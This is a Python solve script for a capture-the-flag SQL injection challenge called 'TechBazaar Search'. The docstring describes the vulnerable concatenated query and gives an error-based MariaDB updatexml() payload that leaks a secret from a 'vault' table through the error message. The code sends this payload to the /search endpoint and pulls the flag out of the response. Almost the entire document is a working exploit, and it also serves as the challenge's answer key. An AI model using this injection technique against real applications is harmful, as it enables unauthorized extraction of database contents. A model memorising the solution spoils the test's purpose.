#!/usr/bin/env python3
"""Reference solve for sqli2 (TechBazaar Search).

The search page builds its query by concatenation:

    SELECT id, name, price, description FROM products
    WHERE name LIKE '%<q>%'

and prints database errors to the page. With

    q = %' AND updatexml(1, CONCAT(0x7e, (SELECT secret FROM vault
        LIMIT 1)), 1) --

updatexml() chokes on the '~flag{...}' XPATH and MariaDB reports the
whole expression in the error message - the flag comes back in the
"Search failed" card. (The page HTML-escapes it, so unescape first.)

    python solve.py                 # localhost:8031
    python solve.py http://host:8031
"""
import html
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8031")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
PAYLOAD = ("%' AND updatexml(1, CONCAT(0x7e, (SELECT secret FROM vault "
           "LIMIT 1)), 1) -- ")


def main() -> int:
    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)

    try:
        r = s.get(BASE + "/search", params={"q": PAYLOAD}, timeout=10)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(html.unescape(r.text))
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
